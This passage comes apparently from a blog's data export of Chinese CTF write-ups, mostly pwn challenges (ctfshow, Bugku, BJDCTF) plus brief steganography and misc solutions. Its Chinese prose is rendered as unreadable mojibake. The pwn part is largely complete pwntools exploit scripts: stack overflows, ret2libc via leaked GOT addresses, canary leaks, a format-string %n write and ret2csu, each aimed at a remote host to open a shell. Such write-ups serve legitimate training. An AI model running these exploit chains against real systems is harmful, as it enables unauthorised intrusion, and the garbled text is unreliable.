ˆæº¢å‡ºï¼Œä½†æ˜¯æ²¡æœ‰åé—¨å‡½æ•°ä»¥åŠsystemå‡½æ•°ï¼Œä¹Ÿä¸èƒ½åˆ©ç”¨ç³»ç»Ÿè°ƒç”¨\næ‰€ä»¥å‡½æ•°åœ°å€æ³„éœ²è·å¾—libcç‰ˆæœ¬æ¥è·å¾—systemå‡½æ•°åœ°å€ä»è€Œè·å¾—shellã€‚å…·ä½“æ­¥éª¤ï¼š\n\næ³„éœ² putsåœ°å€\nè·å– libc ç‰ˆæœ¬\nè·å– system åœ°å€ä¸ /bin/sh çš„åœ°å€\nå†æ¬¡æ‰§è¡Œæºç¨‹åº\nè§¦å‘æ ˆæº¢å‡ºæ‰§è¡Œ system(â€˜/bin/shâ€™)\n\nexp12345678910111213141516171819from pwn import *from LibcSearcher import LibcSearcher#p = process(&#x27;./stack1&#x27;)p = remote(&#x27;pwn.challenge.ctf.show&#x27;,28015)elf = ELF(&#x27;./stack1&#x27;)puts_plt = elf.plt[&#x27;puts&#x27;]       # è·å–putsçš„pltputs_got = elf.got[&#x27;puts&#x27;]           # è·å–putsçš„gotstart_addr = elf.symbols[&#x27;_start&#x27;]          # è·å–ç¨‹åºå¼€å§‹åœ°å€payload1 = flat([&#x27;a&#x27;*13,puts_plt,start_addr,puts_got])         # æ³„éœ²putsçš„gotåœ°å€p.sendline(payload1)p.recvuntil(&#x27;\\n\\n&#x27;)         # è¿™é‡Œè€½è¯¯äº†å¥½ä¹…ï¼Œå› ä¸ºè¦è¯»å–æ‰ä¸¤ä¸ªæ¢è¡Œç¬¦ï¼Œä¸ç„¶åé¢è·å–åœ°å€å°±ä¼šå‡ºé”™libc_puts_addr = u32(p.recv()[0:4])          # æ¥æ”¶æ³„éœ²çš„åœ°å€libc = LibcSearcher(&#x27;puts&#x27;, libc_puts_addr)        # æ‰¾åˆ°å¯¹åº”çš„libclibcbase = libc_puts_addr - libc.dump(&#x27;puts&#x27;)         # è®¡ç®—åŸºåœ°å€sys_addr = libcbase+libc.dump(&#x27;system&#x27;)         # ç®—å‡ºsystemå‡½æ•°çš„åœ°å€bin_sh = libcbase+libc.dump(&#x27;str_bin_sh&#x27;)payload = flat([&#x27;a&#x27;*13,sys_addr,&#x27;a&#x27;*4,bin_sh])p.sendline(payload)p.interactive()\n\npwn04ç”¨idaæ‰“å¼€å‘ç°å­˜åœ¨æ˜æ˜¾çš„æ ˆæº¢å‡ºå¹¶ä¸”è¿˜å­˜åœ¨åé—¨å‡½æ•°\n\nchecksecæŸ¥çœ‹å‘ç°å­˜åœ¨canaryä¿æŠ¤ï¼Œæ‰€ä»¥æ€è·¯å°±æ˜¯ç»•è¿‡canaryä¿æŠ¤è¿›å…¥åé—¨å‡½æ•°ä»è€Œè·å–shell\né€šè¿‡IDAæŸ¥çœ‹å¯ä»¥å‘ç°canaryåœ¨ebp-cçš„ä½ç½®ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥åˆ©ç”¨ç¬¬ä¸€è½®è¾“å…¥æ¥æ³„éœ²canary\n1234payload1 = &#x27;a&#x27;*0x64p.sendlineafter(&#x27;Hello Hacker!\\n&#x27;,payload1)a = p.recvline()canary = p.recv(7).rjust(8,&#x27;\\x00&#x27;)\n\nå› ä¸ºå­˜åœ¨å›æ˜¾æ‰€ä»¥è¦å°†å›æ˜¾æ¥æ”¶ä¸ç„¶canaryå°±ä¼šå‡ºé”™ï¼Œå·²ç»è¸©å‘\n\nè·å–äº†canaryæ¥ä¸‹æ¥å°±æ˜¯ç»•è¿‡canaryè¿›å…¥åé—¨å‡½æ•°\n12payload2 = flat([&#x27;a&#x27;*0x64,canary,&#x27;a&#x27;*8,get_shell])p.sendline(payload2)\n\nå› ä¸ºcanaryæ˜¯å››ä¸ªå­—èŠ‚ï¼Œè€Œåˆ°è¿”å›åœ°å€è¿˜éœ€è¦0x70-0x64-4=8ä¸ªå­—èŠ‚ï¼Œæ‰€ä»¥éœ€è¦è¡¥å……8ä¸ªå­—èŠ‚\nEXPexp1:\n123456789101112from pwn import *p = remote(&#x27;pwn.challenge.ctf.show&#x27;,28132)# p = process(&#x27;./ex2&#x27;)get_shell = 0x80485AFpayload1 = &#x27;a&#x27;*0x64p.sendlineafter(&#x27;Hello Hacker!\\n&#x27;,payload1)a = p.recvline()canary = p.recv(7).rjust(8,&#x27;\\x00&#x27;)print canarypayload2 = flat([&#x27;a&#x27;*0x64,canary,&#x27;a&#x27;*8,get_shell])p.sendline(payload2)p.interactive()\n\nexp2ï¼š\nä¹Ÿæ˜¯é€šè¿‡printfæ³„éœ²ï¼Œä¸è¿‡æ˜¯é€šè¿‡è®¡ç®—canaryåˆ°printfçš„åç§»æ¥æ³„éœ²\n1234567891011from pwn import *#p = process(&quot;./ex&quot;)p =remote(&quot;111.231.70.44&quot;,28097)p.recv()leak_canary = &quot;%31$x&quot;p.sendline(leak_canary)canary = int(p.recv(),16)print(hex(canary))getshell = b&quot;a&quot; * 100 + p32(canary) + b&quot;b&quot; * 12 + p32(0x0804859B)p.sendline(getshell)p.interactive()\n\npwn07æ‰“å¼€å‘ç°æ˜¯64ä½ç¨‹åºï¼Œåˆ†æä¸€ä¸‹å‘ç°pwn03åšæ³•ç›¸åŒï¼Œæ³„éœ²å‡½æ•°åœ°å€ä»è€Œè·å–libcç‰ˆæœ¬æ‰¾åˆ°systemå‡½æ•°è¿›è€Œè·å–shellã€‚åœ¨æŸäº›ç»†èŠ‚ä¸Šè¿˜æ˜¯æœ‰ç‚¹ä¸åŒï¼Œ32ä½æ˜¯é€šè¿‡æ ˆä¼ é€’å‚æ•°ï¼Œè€Œ64ä½æ˜¯é€šè¿‡å¯„å­˜å™¨ä¼ é€’å‚æ•°(å½“å‚æ•°å°äº7ä¸ªæ—¶ï¼Œå‚æ•°ä»å·¦åˆ°å³æ”¾å…¥å¯„å­˜å™¨rdi,rsi,rdx,rcx,r8,r9)ï¼Œæ‰€ä»¥æ‰§è¡Œsystem(â€œbin/shâ€)æ—¶rdiå¯„å­˜å™¨è¦å­˜å‚¨çš„æ˜¯bin/shå­—ç¬¦ä¸²ï¼Œä¾‹å¦‚ï¼š\næ³„éœ²putså‡½æ•°éœ€è¦å…ˆå°†putsçš„gotè¡¨åœ°å€ä¼ é€’åˆ°rdiå¯„å­˜å™¨ä¸­åœ¨è·³è½¬åˆ°putså‡½æ•°è¾“å‡º\n1payload1 = &#x27;a&#x27;*20 + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(start_addr)\n\nåœ¨æ‰§è¡Œsystemå‡½æ•°æ—¶ä¸ä»…è¦è®°ä½é€šè¿‡rdiä¼ å‚è¿˜è¦æ³¨æ„å †æ ˆå¯¹é½ï¼š\n1payload = &#x27;a&#x27;*20+p64(ret_addr)+p64(pop_rdi_ret)+p64(bin_sh)+p64(sys_addr)\n\np64(ret_addr)ç›®çš„ç”¨äºå †æ ˆå¯¹é½ï¼Œä¸ç„¶åé¢ä¼šæŠ¥é”™ã€‚\nEXP123456789101112131415161718192021from pwn import *from LibcSearcher import LibcSearcher#p = process(&#x27;./pwn1&#x27;)p = remote(&#x27;pwn.challenge.ctf.show&#x27;,28138)pop_rdi_ret = 0x04006e3ret_addr = 0x0004006E4elf = ELF(&#x27;./pwn1&#x27;)puts_plt = elf.plt[&#x27;puts&#x27;]puts_got = elf.got[&#x27;puts&#x27;]start_addr = elf.symbols[&#x27;_start&#x27;]payload1 = &#x27;a&#x27;*20 + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(start_addr)p.sendline(payload1)p.recvuntil(&#x27;\\x0a&#x27;)libc_puts_addr = u64(p.recv(6).ljust(8,b&#x27;\\x00&#x27;))libc = LibcSearcher(&#x27;puts&#x27;, libc_puts_addr)libcbase = libc_puts_addr - libc.dump(&#x27;puts&#x27;)sys_addr = libcbase+libc.dump(&#x27;system&#x27;)bin_sh = libcbase+libc.dump(&#x27;str_bin_sh&#x27;)payload = &#x27;a&#x27;*20+p64(ret_addr)+p64(pop_rdi_ret)+p64(bin_sh)+p64(sys_addr)p.sendline(payload)p.interactive()\n\npwn1012345678910111213141516171819202122232425%a  æµ®ç‚¹æ•°ã€åå…­è¿›åˆ¶æ•°å­—å’Œp-è®°æ•°æ³•ï¼ˆc99%A  æµ®ç‚¹æ•°ã€åå…­è¿›åˆ¶æ•°å­—å’Œp-è®°æ³•ï¼ˆc99ï¼‰%c  ä¸€ä¸ªå­—ç¬¦(char)%C  ä¸€ä¸ªISOå®½å­—ç¬¦%d  æœ‰ç¬¦å·åè¿›åˆ¶æ•´æ•°(int)ï¼ˆ%ldã€%Ldï¼šé•¿æ•´å‹æ•°æ®(long),%hdï¼šè¾“å‡ºçŸ­æ•´å½¢ã€‚ï¼‰ã€€%e  æµ®ç‚¹æ•°ã€e-è®°æ•°æ³•%E  æµ®ç‚¹æ•°ã€E-è®°æ•°æ³•%f  å•ç²¾åº¦æµ®ç‚¹æ•°(é»˜è®¤float)ã€åè¿›åˆ¶è®°æ•°æ³•ï¼ˆ%.nf  è¿™é‡Œnè¡¨ç¤ºç²¾ç¡®åˆ°å°æ•°ä½ånä½.åè¿›åˆ¶è®¡æ•°ï¼‰%g  æ ¹æ®æ•°å€¼ä¸åŒè‡ªåŠ¨é€‰æ‹©%fæˆ–%eï¼%G  æ ¹æ®æ•°å€¼ä¸åŒè‡ªåŠ¨é€‰æ‹©%fæˆ–%e.%i  æœ‰ç¬¦å·åè¿›åˆ¶æ•°ï¼ˆä¸%dç›¸åŒï¼‰%nï¼šå°†%nä¹‹å‰printfå·²ç»æ‰“å°çš„å­—ç¬¦ä¸ªæ•°èµ‹å€¼ç»™åç§»å¤„æŒ‡é’ˆæ‰€æŒ‡å‘çš„åœ°å€ä½ç½®%o  æ— ç¬¦å·å…«è¿›åˆ¶æ•´æ•°%p  æŒ‡é’ˆ%s  å¯¹åº”å­—ç¬¦ä¸²char*ï¼ˆ%s &#x3D; %hs &#x3D; %hS è¾“å‡º çª„å­—ç¬¦ï¼‰%S  å¯¹åº”å®½å­—ç¬¦ä¸²WCAHR*ï¼ˆ%ws &#x3D; %S è¾“å‡ºå®½å­—ç¬¦ä¸²ï¼‰%u  æ— ç¬¦å·åè¿›åˆ¶æ•´æ•°(unsigned int)%x  ä½¿ç”¨åå…­è¿›åˆ¶æ•°å­—0xfçš„æ— ç¬¦å·åå…­è¿›åˆ¶æ•´æ•°ã€€%X  ä½¿ç”¨åå…­è¿›åˆ¶æ•°å­—0xfçš„æ— ç¬¦å·åå…­è¿›åˆ¶æ•´æ•°%%  æ‰“å°ä¸€ä¸ªç™¾åˆ†å· %I64d ç”¨äºINT64 æˆ–è€… long long%I64u ç”¨äºUINT64 æˆ–è€… unsigned long long%I64x ç”¨äº64ä½16è¿›åˆ¶æ•°æ®%m.n : mæŒ‡åŸŸå®½ï¼Œå³å¯¹åº”çš„è¾“å‡ºé¡¹åœ¨è¾“å‡ºè®¾å¤‡ä¸Šæ‰€å çš„å­—ç¬¦æ•°ã€‚næŒ‡ç²¾åº¦ã€‚ç”¨äºè¯´æ˜è¾“å‡ºçš„å®å‹æ•°çš„å°æ•°ä½æ•°ã€‚ä¸ºæŒ‡å®šnæ—¶ï¼Œéšå«çš„ç²¾åº¦ä¸ºn&#x3D;6ä½ã€‚l å¯¹æ•´å‹æŒ‡longå‹ï¼Œå¯¹å®å‹æŒ‡doubleå‹ã€‚hç”¨äºå°†æ•´å‹çš„æ ¼å¼å­—ç¬¦ä¿®æ­£ä¸ºshortå‹ã€‚\n\næ‰“å¼€åå‘ç°å½“num==16æ—¶å°±å¯ä»¥å¾—åˆ°flagï¼Œä½†æ˜¯æ²¡æœ‰æ ˆæº¢å‡ºå¯ä»¥è¦†ç›–numçš„å€¼ã€‚ä»”ç»†è§‚å¯Ÿï¼Œè¿™é‡Œè¾“å‡ºç”¨çš„æ˜¯printfå‡½æ•°å­˜åœ¨æ ¼å¼å­—ç¬¦ä¸²æ¼æ´ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨%nå»ä¿®æ”¹numï¼Œé¦–å…ˆéœ€è¦numçš„åœ°å€ï¼Œå…¶æ¬¡éœ€è¦ä¸€ä¸ªå‚æ•°æŒ‡å‘numã€‚é€šè¿‡å‘ç°æˆ‘ä»¬å¯ä»¥çœ‹åˆ°scanfå¯¹formatèµ‹å€¼äº†ä¸¤æ¬¡ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥å…ˆå°†numçš„åœ°å€èµ‹ç»™formatï¼Œæ¥ä¸‹æ¥ä½¿ç”¨%næ¥ä¿®æ”¹formatæŒ‡å‘numçš„å€¼\n\nEXP12345678from pwn import *p = remote(&#x27;pwn.challenge.ctf.show&#x27;,28101)#p = process(&quot;./pwn10&quot;)num_addr = 0x0804A030payload = p32(num_addr)+&quot;aaaaaaaaaaaa%7$n&quot;p.sendline(payload)p.interactive()\n\nèŒæ–°èµ›-ç­¾åˆ°é¢˜å°±æ˜¯ç®€å•çš„libcæ³„éœ²ã€‚è®¡ç®—ä¸€ä¸‹srcçš„åç§»ï¼Œæ‰¾åˆ°ç›¸åº”gadgetæ³„éœ²å‡½æ•°åœ°å€åœ¨è·å¾—libcçš„ç‰ˆæœ¬è·å–systemå‡½æ•°å’Œå­—ç¬¦ä¸²bin/shåœ°å€ï¼Œæœ€åç»„è£…ä¸€ä¸‹å°±è¡Œ\n\n12345678910111213141516171819202122from pwn import *from LibcSearcher import LibcSearchercontext.log_level = &#x27;debug&#x27;context.arch = &#x27;amd64&#x27;p = process(&#x27;./pwn_check_in&#x27;)elf = ELF(&#x27;pwn_check_in&#x27;)puts_plt=elf.plt[&quot;puts&quot;]puts_got=elf.got[&quot;puts&quot;]start_addr=elf.symbols[&quot;_start&quot;]pop_rdi_ret = 0x400793ret_addr = 0x40053epayload1 = &#x27;a&#x27;*0x78+p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(start_addr)p.sendlineafter(&#x27;[+] command successful!\\n&#x27;,payload1)p.recvuntil(&#x27;hhh,just a joke&#x27;)puts_addr = u64(p.recv(6).ljust(8,&#x27;\\x00&#x27;))libc=LibcSearcher(&quot;puts&quot;,puts_addr)libcbase=puts_addr-libc.dump(&quot;puts&quot;)system_addr=libcbase+libc.dump(&quot;system&quot;)binsh_addr=libcbase+libc.dump(&quot;str_bin_sh&quot;)payload2 = &#x27;a&#x27;*0x78+p64(ret_addr)+p64(pop_rdi_ret)+p64(binsh_addr)+p64(system_addr)p.sendlineafter(&#x27;[+] command successful!\\n&#x27;,payload2)p.interactive()\n\nå†…éƒ¨èµ›-ç­¾åˆ°é¢˜æ­¤é¢˜ä¸ret2csuåšæ³•ç›¸åŒï¼Œå› ä¸ºæ²¡æœ‰putså‡½æ•°ä½†æ˜¯å­˜åœ¨writeå‡½æ•°ï¼Œæ‰€ä»¥æˆ‘ä»¬é‡‡å–ç»„è£…writeå‡½æ•°æ¥æ³„éœ²åœ°å€ï¼Œä»è€Œè·å–systemå‡½æ•°ä»¥åŠbin/shåœ°å€ã€‚\n\ngadgetså’Œret2csué‡Œé¢çš„æœ‰ç‚¹ä¸ä¸€æ ·ä½†æ˜¯å¤§è‡´æ˜¯ä¸€æ ·çš„ã€‚æˆ‘ä»¬åˆ©ç”¨è¿™ä¸¤ä¸ªgadgetsæ¥ç»„è£…writeå‡½æ•°ï¼Œæ³„éœ²æˆ‘ä»¬æƒ³æ³„éœ²å‡½æ•°çš„gotè¡¨ä¸­åœ°å€\n1payload1 = &#x27;b&#x27;*0xa8+p64(gadget1)+p64(0)+p64(0)+p64(1)+p64(got_write)+p64(8)+p64(got_write)+p64(1)+p64(gadget2)+&#x27;a&#x27;*56+ p64(start)\n\nä¹‹ååˆ©ç”¨æ³„éœ²çš„åœ°å€è®¡ç®—systemå‡½æ•°ä»¥åŠbin/shåœ°å€\n12345write_addr = u64(p.recv(6).ljust(8,b&#x27;\\x00&#x27;))libc = LibcSearcher(&#x27;write&#x27;, write_addr)libcbase = write_addr-libc.dump(&#x27;write&#x27;)system_addr = libcbase+libc.dump(&#x27;system&#x27;)binsh_addr=libcbase+libc.dump(&quot;str_bin_sh&quot;)\n\næœ€åç»„è£…payload2æ¥æ§åˆ¶ç¨‹åºæ‰§è¡Œsystem(â€œbin/shâ€)\n1payload2 = &#x27;a&#x27;*0xa8+p64(ret_addr)+p64(pop_rdi_ret)+p64(binsh_addr)+p64(system_addr)\n\nEXP123456789101112131415161718192021222324from pwn import *from LibcSearcher import LibcSearchercontext.log_level = &#x27;debug&#x27;context.arch = &#x27;amd64&#x27;#p = process(&#x27;./ret2libc_64&#x27;)p = remote(&#x27;pwn.challenge.ctf.show&#x27;,28177)elf = ELF(&#x27;ret2libc_64&#x27;)got_write = elf.got[&#x27;write&#x27;]got_write = elf.got[&#x27;write&#x27;]start = elf.symbols[&#x27;_start&#x27;]  pop_rdi_ret = 0x04006c3ret_addr = 0x004004a9gadget1 = 0x4006b6gadget2 = 0x04006A0payload1 = &#x27;b&#x27;*0xa8+p64(gadget1)+p64(0)+p64(0)+p64(1)+p64(got_write)+p64(8)+p64(got_write)+p64(1)+p64(gadget2)+&#x27;a&#x27;*56+ p64(start)p.sendlineafter(&#x27;now,Try Pwn Me?\\n&#x27;,payload1)write_addr = u64(p.recv(6).ljust(8,b&#x27;\\x00&#x27;))libc = LibcSearcher(&#x27;write&#x27;, write_addr)libcbase = write_addr-libc.dump(&#x27;write&#x27;)system_addr = libcbase+libc.dump(&#x27;system&#x27;)binsh_addr=libcbase+libc.dump(&quot;str_bin_sh&quot;)payload2 = &#x27;a&#x27;*0xa8+p64(ret_addr)+p64(pop_rdi_ret)+p64(binsh_addr)+p64(system_addr)p.sendlineafter(&#x27;now,Try Pwn Me?\\n&#x27;,payload2)p.interactive()\n\n36Dæ¯-ç­¾åˆ°ç­¾åˆ°é¢˜ç›´æ¥ncä¸Šå»ä»¥åå‘ç°è€ƒå¯Ÿçš„æ˜¯linuxçš„åŸºæœ¬æ“ä½œï¼Œç¨‹åºè¿‡æ»¤æ‰äº†ç©ºæ ¼ï¼Œcatï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥lsæŸ¥çœ‹\n1more&lt;flag               è¿™é‡Œ&lt;å¯ä»¥ç»•è¿‡ç©ºæ ¼\n\nBJDCTF2020-babyrouterä¸çŸ¥é“æ˜¯è¿œç«¯æœ‰é—®é¢˜è¿˜æ˜¯libcåº“ä¸å…¨ï¼Œæœ¬åœ°æ‰“é€šäº†ä½†æ˜¯è¿œç«¯æ²¡æœ‰æ‰“é€šï¼Œåæ­£æ€è·¯åœ¨è¿™é‡Œ\nå¾ˆæ˜æ˜¾çš„ä¸€é“libcæ³„éœ²é¢˜ç›®ï¼Œbufçš„åç§»æ˜¯0x20\n\nå¯»æ‰¾gadgets\n\n\næ„é€ payload1ï¼Œpayload2\n12payload1 = &#x27;a&#x27;*0x28+p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(start_addr)payload2 = &#x27;a&#x27;*0x28+p64(ret)+p64(pop_rdi_ret)+p64(binsh_addr)+p64(system_addr)\n\nEXP123456789101112131415161718192021222324252627from pwn import *from LibcSearcher import *context.log_level = &#x27;debug&#x27;context.arch = &#x27;amd64&#x27;#p = process(&#x27;./babyrouter&#x27;)p = remote(&#x27;pwn.challenge.ctf.show&#x27;,28044)elf=ELF(&#x27;./babyrouter&#x27;)puts_plt=elf.plt[&quot;puts&quot;]puts_got=elf.got[&quot;puts&quot;]start_addr=elf.symbols[&quot;_start&quot;]pop_rdi_ret=0x000400733ret = 0x4004c9payload1 = &#x27;a&#x27;*0x28+p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(start_addr)p.sendlineafter(&#x27;Pull up your sword and tell me u story!&#x27;,payload1)p.recvuntil(&#x27;\\n&#x27;)puts_addr=u64(p.recv(6).ljust(8,&#x27;\\x00&#x27;))libc=LibcSearcher(&quot;puts&quot;,puts_addr)#libc=ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)libcbase=puts_addr-libc.dump(&quot;puts&quot;)#system_addr = libcbase + libc.sym[&#x27;system&#x27;]system_addr=libcbase+libc.dump(&quot;system&quot;)#binsh_addr = libcbase + libc.search(&#x27;/bin/sh\\0&#x27;).next()binsh_addr=libcbase+libc.dump(&quot;str_bin_sh&quot;)payload2 = &#x27;a&#x27;*0x28+p64(ret)+p64(pop_rdi_ret)+p64(binsh_addr)+p64(system_addr)#gdb.attach(p)p.sendlineafter(&#x27;Pull up your sword and tell me u story!&#x27;,payload2)p.interactive()\n\n","slug":"ctfshow-pwn","date":"2021-10-17T09:55:50.000Z","categories_index":"åˆ·é¢˜","tags_index":"pwn","author_index":"Krito"},{"id":"050531b15fb9d2cd0cab573b50dcfcd8","title":"ctfshow-misc","content":"misc1ç­¾åˆ°é¢˜ï¼Œæ‰“å¼€å°±æœ‰flag\nmisc2æ‰“å¼€txtæ–‡ä»¶å‡ºç°ä¸€å †ä¹±ç ï¼Œä¸¢è¿›winhexå‘ç°æ˜¯pngï¼Œç›´æ¥æ”¹åç¼€åå³å¯\nmisc3bpgæ–‡ä»¶ä½¿ç”¨bpgviewå·¥å…·æ‰“å¼€ï¼Œæ‰“å¼€åå³å¯è·å¾—flag\n\n","slug":"ctfshow-misc","date":"2021-10-16T14:43:36.000Z","categories_index":"åˆ·é¢˜","tags_index":"misc","author_index":"Krito"},{"id":"144f81ea5594fe5e9363a228d67919cf","title":"Bugku pwn","content":"overflowcheckä¸€ä¸‹å¯ä»¥çœ‹åˆ°æ˜¯64ä½ç¨‹åºï¼Œä»€ä¹ˆä¿æŠ¤ä¹Ÿæ²¡å¼€ï¼ŒIDAæŸ¥çœ‹ï¼Œå¯ä»¥çœ‹åˆ°å­˜åœ¨æ˜æ˜¾çš„æ ˆæº¢å‡º\nå†çœ‹å‡½æ•°çª—å£ï¼Œå¯ä»¥çœ‹è§å­˜åœ¨ä¸€ä¸ªå¯ç–‘çš„å‡½æ•°ï¼Œç‚¹è¿›å»å¯ä»¥å‘ç°æ˜¯ä¸€ä¸ªåé—¨å‡½æ•°\n\næ‰€ä»¥æ€è·¯å°±æ˜¯åˆ©ç”¨æ ˆæº¢å‡ºè·³è½¬åˆ°åé—¨å‡½æ•°ï¼Œè¿™æ ·å°±å¯ä»¥å¾—åˆ°flag\nEXP12345from pwn import *p = process(&quot;./pwn2&quot;)payload = &#x27;a&#x27;*0x30+&#x27;a&#x27;*8+p64(0x400769)p.sendline(payload)p.interactive()\n\noverflow2checkä¸€ä¸‹ï¼Œ64ä½å¼€äº†NXä¿æŠ¤ã€‚IDAæŸ¥çœ‹ï¼Œå­˜åœ¨æº¢å‡º\nåœ¨å‡½æ•°çª—å£å‘ç°systemå‡½æ•°ï¼Œåœ¨å­—ç¬¦ä¸²çª—å£å‘ç°bin/shã€‚å¯ä»¥åˆ©ç”¨ROPæ¥è·å¾—shell\næ‰¾åˆ°gadgetçš„åœ°å€\næ„å»ºpayloadå°±å¯ä»¥äº†\nEXP123456789from pwn import *#p = process(&quot;./pwn5&quot;)p = remote(&quot;114.67.246.176&quot;,15097)sys_addr = 0x401050bin_sh = 0x402004pop_rdi = 0x40126bpayload = &#x27;a&#x27;*0x20+&#x27;a&#x27;*8+p64(pop_rdi)+p64(bin_sh)+p64(sys_addr)p.sendline(payload)p.interactive()\n\n\n\nread_noteç­¾åˆ°é¢˜ï¼Œç›´æ¥å¯ä»¥è·å¾—flag\nCanaryçœ‹é¢˜ç›®å°±çŸ¥é“æ˜¯è€ƒcanaryï¼Œcheckä¸€ä¸‹ï¼Œå‘ç°æ˜¯ä¸€ä¸ª64ä½ç¨‹åºï¼Œå¼€äº†canaryå’ŒNXä¿æŠ¤\næŸ¥çœ‹ä¸€ä¸‹ä¼ªä»£ç ï¼Œå¾ˆæ˜æ˜¾ï¼Œå­˜åœ¨æ ˆæº¢å‡ºæ¼æ´ï¼Œreadå¯ä»¥è¯»å–0x300å­—èŠ‚ï¼Œä½†ç¼“å†²åŒºåªæœ‰0x240å­—èŠ‚ç©ºé—´\næŸ¥çœ‹å­—ç¬¦ä¸²ï¼Œå‘ç°å­˜åœ¨bin/shï¼Œåœ¨å‡½æ•°è¡¨é‡Œé¢ä¹Ÿå­˜åœ¨systemå‡½æ•°\næ‰€ä»¥æ€è·¯å¤§æ¦‚å‡ºæ¥äº†ï¼Œåˆ©ç”¨gadgetsæ¥è·å–shellã€‚æ¥ä¸‹æ¥å°±æ˜¯æ€è€ƒå¦‚ä½•è§£å†³canaryä¿æŠ¤ï¼Œè§‚å¯Ÿä¼ªä»£ç ï¼Œé‡Œé¢æœ‰printfå‡½æ•°ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨printfå‡½æ•°æ¥æ³„éœ²canaryï¼Œprintfå‡½æ•°è¾“å‡ºæ—¶ä¼šä»¥x00ä¸ºè¾“å‡ºç»“å°¾ï¼Œåªè¦æˆ‘ä»¬å°†canaryå€¼çš„x00è¦†ç›–æ‰å°±å¯ä»¥æ³„éœ²äº†ã€‚\næ‰€ä»¥ï¼Œç¬¬ä¸€æ­¥ï¼Œè·å–gadgetsã€‚å› ä¸ºæ˜¯64ä½ç¨‹åºï¼Œæ‰€ä»¥ä¼ å‚æ—¶å‰å…­ä¸ªå‚æ•°æ˜¯åˆ©ç”¨rdi, rsi, rdx, rcx, r8, r9å¯„å­˜å™¨æ¥ä¼ é€’ï¼Œæ‰€ä»¥éœ€è¦å°†bin/shä¼ é€’åˆ°rdiå¯„å­˜å™¨ã€‚\næ¥ä¸‹æ¥å°±æ˜¯æ³„éœ²canaryï¼Œbufçš„åç§»é‡æ˜¯0x240-8(å‡8æ˜¯å› ä¸ºcanaryçš„å€¼åœ¨ebpå‡8çš„ä½ç½®)ï¼Œä¹‹ååˆ©ç”¨printfå‡½æ•°æ³„éœ²å³å¯ã€‚\næœ€åå†ç»„è£…ä¸€ä¸‹å°±å¯ä»¥å¾—å‡ºexpäº†ã€‚\nEXP12345678910111213from pwn import *p = process(&#x27;./pwn4_&#x27;)pop_rdi = 0x400963binsh = 0x601068sys = 0x40080Cpayload = &#x27;a&#x27; * (0x240 - 8)p.sendlineafter(&#x27;Please leave your name(Within 36 Length):&#x27;, payload)p.recvline()canary = p.recv(7).rjust(8, &#x27;\\x00&#x27;)print canarypayload1 = &#x27;a&#x27; * (0x210 - 8) + canary + &#x27;a&#x27;*8 + p64(pop_rdi) + p64(binsh) + p64(sys)p.sendafter(&#x27;Please leave a message(Within 0x200 Length):&#x27; , payload1)p.interactive()\n\n","slug":"Bugku-PWN","date":"2021-10-16T14:10:52.000Z","categories_index":"åˆ·é¢˜","tags_index":"pwn","author_index":"Krito"},{"id":"baaff0bca7d1361050d55356188b2514","title":"Bugku misc","content":"BUGKU miscéƒ¨åˆ†1 è¿™æ˜¯ä¸€å¼ å•çº¯çš„å›¾ç‰‡å…ˆçœ‹äº†ä¸€ä¸‹å±æ€§ï¼Œå‘ç°å¹¶æ²¡æœ‰ä»€ä¹ˆæœ‰ç”¨çš„ä¿¡æ¯ï¼Œæ‰“å¼€å°±æ˜¯ä¸Šé¢é‚£å¼ å›¾ï¼Œæ²¡æœ‰ä¸Šé¢å¼‚æ ·ï¼Œ\n\n\nç›´æ¥ä¸¢winhexï¼Œæ‹–è‡³æœ€åº•ï¼Œå‘ç°æ˜¯unicodeåŠ å¯†\n\n\nå‘ç°æ˜¯unicodeåŠ å¯†ï¼Œç›´æ¥è§£ç æˆASCIIï¼Œå¾—åˆ°flag\n\n\n\n2 éšå†™çœ‹åˆ°é¢˜ç›®å°±çŸ¥é“æ˜¯å›¾ç‰‡éšå†™ï¼Œå¯¹å›¾ç‰‡è¿›è¡Œæ ¡éªŒå’Œï¼Œå‘ç°ç»“æœæœ‰é—®é¢˜ï¼Œè¯´æ˜ç…§ç‰‡é«˜åº¦è¢«ä¿®æ”¹äº†\n\n\nä¿®æ”¹é«˜åº¦å¾—åˆ°flag\n\n\n\n3 telnetä¸‹è½½é™„ä»¶åæ‰“å¼€ï¼Œç›´æ¥è¿½è¸ªTCPæµå°±å¾—åˆ°äº†flag\n\n\n\n4 çœ¼è§éå®æ‰“å¼€åå‘ç°æ–‡ä»¶æ˜¯æŸåçš„è€Œä¸”å‡ºç°äº†PKå­—ç¬¦ï¼ŒçŒœæµ‹é‡Œé¢è—æœ‰å‹ç¼©åŒ…ï¼Œäºæ˜¯æ”¹æˆå‹ç¼©åŒ…å½¢å¼æ‰“å¼€\n\n\nåœ¨wordé‡Œé¢çš„document.xmlé‡Œé¢å‘ç°äº†flag\n\n\n\n5 å•Šå“’è€è§„çŸ©ï¼Œæ‰“å¼€ç…§ç‰‡çœ‹å±æ€§ï¼Œå‘ç°ç…§ç›¸æœºå‹å·æœ‰ä¸œè¥¿ï¼Œä¹‹ååº”è¯¥ç”¨å¾—ä¸Š\n\n\nç”¨binwalkæŸ¥çœ‹ï¼Œå‘ç°é‡Œé¢è—æœ‰ä¸€ä¸ªå‹ç¼©åŒ…ï¼Œç”¨foremostè¿›è¡Œåˆ†ç¦»å¾—åˆ°å‹ç¼©åŒ…ï¼Œæ‰“å¼€å‘ç°æ˜¯åŠ å¯†çš„ï¼Œå°è¯•äº†ç…§ç›¸æœºå‹å·ï¼Œå‘ç°å¯†ç é”™è¯¯ï¼Œåˆ†æäº†ä¸€ä¸‹é‚£ä¸²ç…§ç›¸æœºå‹å·ï¼Œå‘ç°æ˜¯åå…­è¿›åˆ¶ï¼Œä¹‹åè§£ç å¾—åˆ°å¯†ç \n\n\næ‰“å¼€å¾—åˆ°flag\n\n\n\n6 